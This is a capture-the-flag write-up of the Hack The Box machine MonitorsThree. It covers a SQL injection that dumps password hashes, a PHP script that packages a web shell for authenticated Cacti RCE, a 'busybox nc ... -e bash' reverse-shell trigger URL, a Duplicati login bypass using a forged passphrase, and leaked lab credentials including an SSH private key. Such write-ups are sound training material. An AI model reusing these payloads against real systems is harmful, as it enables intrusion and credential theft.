---
tags:
  - linux
---
# HTB: [MonitorsThree](https://app.hackthebox.com/machines/MonitorsThree)

> [!tip]- Spoiler Summary
> The machine featured a Cacti monitoring system vulnerable to authenticated RCE. Subdomain discovery revealed `cacti.monitorsthree.htb`, and SQL Injection at `forgot_password.php` exposed admin credentials. Using `admin:greencacti2001`, I leveraged an XML signature vulnerability to upload a malicious PHP file, achieving remote code execution. Privilege escalation was accomplished by exposing an internal Duplicati service, extracting the server passphrase, and leveraging the Duplicati web interface to back up and restore sensitive files, ultimately gaining root access.

## Enumeration

### Manual Enumeration

```console
$ ffuf -w ~/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://monitorsthree.htb -H 'Host: FUZZ.monitorsthree.htb' -ac
...

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 94ms]
```

![](_/htb-monitorsthree-20241203-1.png)

```console
$ feroxbuster -k -u http://monitorsthree.htb/ -w ~/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -d1
...
301      GET        7l       12w      178c http://monitorsthree.htb/images => http://monitorsthree.htb/images/
200      GET        6l       34w     2166c http://monitorsthree.htb/images/services/02.png
200      GET        5l       30w     1616c http://monitorsthree.htb/images/services/01.png
200      GET       19l       62w     3695c http://monitorsthree.htb/images/services/04.png
200      GET        1l      235w    12063c http://monitorsthree.htb/images/review.svg
200      GET       38l      117w     2813c http://monitorsthree.htb/js/plugins.js
200      GET       11l       15w      188c http://monitorsthree.htb/css/plugins.css
200      GET       24l       99w      770c http://monitorsthree.htb/js/smoothscroll.js
200      GET        9l       43w     3028c http://monitorsthree.htb/images/services/03.png
200      GET       71l      130w     1872c http://monitorsthree.htb/js/custom.js
200      GET       96l      239w     4252c http://monitorsthree.htb/login.php
200      GET        5l      369w    21003c http://monitorsthree.htb/js/popper.min.js
200      GET      935l     1752w    15174c http://monitorsthree.htb/css/style.css
200      GET        1l      393w    15974c http://monitorsthree.htb/images/about-us.svg
200      GET        1l      359w    22207c http://monitorsthree.htb/images/banner.svg
200      GET      109l      619w    13655c http://monitorsthree.htb/images/service.svg
200      GET        7l      277w    44342c http://monitorsthree.htb/js/owl.carousel.min.js
200      GET        7l      683w    60010c http://monitorsthree.htb/js/bootstrap.min.js
200      GET      175l     1248w    89112c http://monitorsthree.htb/admin/assets/images/logo.png
200      GET        4l     1293w    86709c http://monitorsthree.htb/js/jquery-min.js
200      GET       87l     1326w   157954c http://monitorsthree.htb/admin/assets/images/logo.ico
200      GET      338l      982w    13560c http://monitorsthree.htb/
301      GET        7l       12w      178c http://monitorsthree.htb/admin => http://monitorsthree.htb/admin/
301      GET        7l       12w      178c http://monitorsthree.htb/css => http://monitorsthree.htb/css/
301      GET        7l       12w      178c http://monitorsthree.htb/js => http://monitorsthree.htb/js/
301      GET        7l       12w      178c http://monitorsthree.htb/fonts => http://monitorsthree.htb/fonts/
[####################] - 7m    220574/220574  0s      found:26      errors:0
[####################] - 7m    220545/220545  514/s   http://monitorsthree.htb/
```

There's an [authenticated RCE](https://vulners.com/packetstorm/PACKETSTORM:178584) vulnerability, if I can find credentials.

There's a SQLi at `http://monitorsthree.htb/forgot_password.php`:

![](_/htb-monitorsthree-20241203-2.png)

It's slow, but `sqlmap` recovers the data I need:

```sql
Database: monitorsthree_db
Table: users
[4 entries]
+----+------------+-----------------------------+-------------------+-----------+----------------------------------+-----------+-----------------------+------------+
| id | dob        | email                       | name              | salary    | password                         | username  | position              | start_date |
+----+------------+-----------------------------+-------------------+-----------+----------------------------------+-----------+-----------------------+------------+
| 2  | 1978-04-25 | admin@monitorsthree.htb     | Marcus Higgins    | 320800.00 | 31a181c8372e3afc59dab863430610e8 | admin     | Super User            | 2021-01-12 |
| 5  | 1985-02-15 | mwatson@monitorsthree.htb   | Michael Watson    | 75000.00  | c585d01f2eb3e6e1073e92023088a3dd | mwatson   | Website Administrator | 2021-05-10 |
| 6  | 1990-07-30 | janderson@monitorsthree.htb | Jennifer Anderson | 68000.00  | 1e68b6eb86b45f6d92f8f292428f77ac | janderson | Network Engineer      | 2021-06-20 |
| 7  | 1982-11-23 | dthompson@monitorsthree.htb | David Thompson    | 83000.00  | 633b683cc128fe244b00f176c8a950f5 | dthompson | Database Manager      | 2022-09-15 |
+----+------------+-----------------------------+-------------------+-----------+----------------------------------+-----------+-----------------------+------------+
```

![](_/htb-monitorsthree-20241203-3.png)

Credentials: `admin:greencacti2001`

## Remote Code Execution

```php
$ cat x.php
<?php

$xmldata = "<xml>
   <files>
       <file>
           <name>resource/test.php</name>
           <data>%s</data>
           <filesignature>%s</filesignature>
       </file>
   </files>
   <publickey>%s</publickey>
   <signature></signature>
</xml>";
$filedata = '<?php system($_GET["cmd"]); ?>';
$keypair = openssl_pkey_new();
$public_key = openssl_pkey_get_details($keypair)["key"];
openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);
$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));
openssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);
file_put_contents("test.xml", str_replace("<signature></signature>", "<signature>".base64_encode($signature)."</signature>", $data));
system("cat test.xml | gzip -9 > test.xml.gz; rm test.xml");

?>
```

```console
$ php x.php

$ ls -l test.xml.gz
-rw-r--r-- 1 e e 1160 Dec  4 10:30 test.xml.gz
```

![](_/htb-monitorsthree-20241203-4.png)

Trigger with:

```console
http://cacti.monitorsthree.htb/cacti/resource/test.php?cmd=busybox%20nc%2010.10.14.4%20443%20-e%20bash
```

```console
Connection received on 10.10.11.30 60832
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation

```console
www-data@monitorsthree:/tmp$ netstat -lnpt
netstat -lnpt
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8200          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8084            0.0.0.0:*               LISTEN      1234/mono
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1311/nginx: worker
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:42017         0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      1311/nginx: worker
tcp6       0      0 :::22                   :::*                    LISTEN      -
www-data@monitorsthree:/tmp$ which socat
which socat
/usr/bin/socat
www-data@monitorsthree:/tmp$ socat TCP4-LISTEN:8201,fork,reuseaddr TCP4:127.0.0.1:8200
<TCP4-LISTEN:8201,fork,reuseaddr TCP4:127.0.0.1:8200
```

![](_/htb-monitorsthree-20241203-5.png)

[There's a bypass if I have the "server passphrase"](https://github.com/duplicati/duplicati/issues/5197). See also: [Duplicati: Bypassing Login Authentication With Server-passphrase](https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee)

```console
www-data@monitorsthree:~/html/cacti/resource$ find / -name '*.sqlite' 2>/dev/null
<cacti/resource$ find / -name '*.sqlite' 2>/dev/null
/opt/duplicati/config/Duplicati-server.sqlite
/opt/duplicati/config/CTADPNHLTC.sqlite
```

```console
www-data@monitorsthree:~/html/cacti/resource$ find / -name '*.sqlite' 2>/dev/null
<cacti/resource$ find / -name '*.sqlite' 2>/dev/null
/opt/duplicati/config/Duplicati-server.sqlite
/opt/duplicati/config/CTADPNHLTC.sqlite
www-data@monitorsthree:~/html/cacti/resource$ cp /opt/duplicati/config/*.sqlite /var/www/html/cacti/
```

![](_/htb-monitorsthree-20241203-6.png)

- `server-passphrase` is: `Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=&K`
- `server-passphrase-salt` is: `xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=`

![](_/htb-monitorsthree-20241203-7.png)

The server passphrase in hexadecimal is: `59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a`

```http
POST /login.cgi HTTP/1.1
Host: monitorsthree.htb:8201
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://monitorsthree.htb:8201/login.html
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 57
Origin: http://monitorsthree.htb:8201
Connection: keep-alive
Cookie: xsrf-token=x1iJZxI2tbR2rkprm%2Fiyn2kArJvJUBO528xBDBvn1rU%3D; session-nonce=QyzxS%2Bb97v56s49fhLi91Ad1fucs57IM6yXHJGhqV%2FY%3D

password=fnEm4nJeOFhpgpd3D2BbbDxODzqF%2BXnoVQrpqZWmRDk%3D
```

![](_/htb-monitorsthree-20241203-8.png)

```http
POST /login.cgi HTTP/1.1
Host: monitorsthree.htb:8201
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://monitorsthree.htb:8201/login.html
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 57
Origin: http://monitorsthree.htb:8201
Connection: keep-alive
Cookie: xsrf-token=x1iJZxI2tbR2rkprm%2Fiyn2kArJvJUBO528xBDBvn1rU%3D; session-nonce=QyzxS%2Bb97v56s49fhLi91Ad1fucs57IM6yXHJGhqV%2FY%3D

password=ow9Ge0ezyQZ0coTEdq8KQCiZb4C2P9/pDfnsfYUPJMk%3d
```

It works!

![](_/htb-monitorsthree-20241203-9.png)

![](_/htb-monitorsthree-20241203-11.png)

![](_/htb-monitorsthree-20241203-12.png)

![](_/htb-monitorsthree-20241203-13.png)

```console
www-data@monitorsthree:~/html/cacti/include$ cat cocat config.php
cat config.php
<?php
...
$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'localhost';
$database_username = 'cactiuser';
$database_password = 'cactiuser';
$database_port     = '3306';
$database_retries  = 5;
$database_ssl      = false;
...
```

```sql
MariaDB [cacti]> selselect * from user_auth;
select * from user_auth;
+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
| id | username | password                                                     | realm | full_name     | email_address            | must_change_password | password_change | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange | lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms |
+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
|  1 | admin    | $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G |     0 | Administrator | marcus@monitorsthree.htb |                      |                 | on        | on        | on           | on             |          2 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 | -1               |        |               0 |        0 |   436423766 |
|  3 | guest    | $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu |     0 | Guest Account | guest@monitorsthree.htb  |                      |                 | on        | on        | on           |                |          1 |             1 |            1 |            1 |                      1 |         |         -1 |        -1 | -1               |        |               0 |        0 |  3774379591 |
|  4 | marcus   | $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK |     0 | Marcus        | marcus@monitorsthree.htb |                      | on              | on        | on        | on           | on             |          1 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 |                  |        |               0 |        0 |  1677427318 |
+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
3 rows in set (0.000 sec)
```

Cracked:

```console
$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910
```

```console
www-data@monitorsthree:~/html/cacti/include$ su - marcus
su - marcus
Password: 12345678910

marcus@monitorsthree:~$
```

```console
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Using the Duplicati interface, it's possible to backup and restore `/root/root.txt` to a readable location for the user `marcus`.
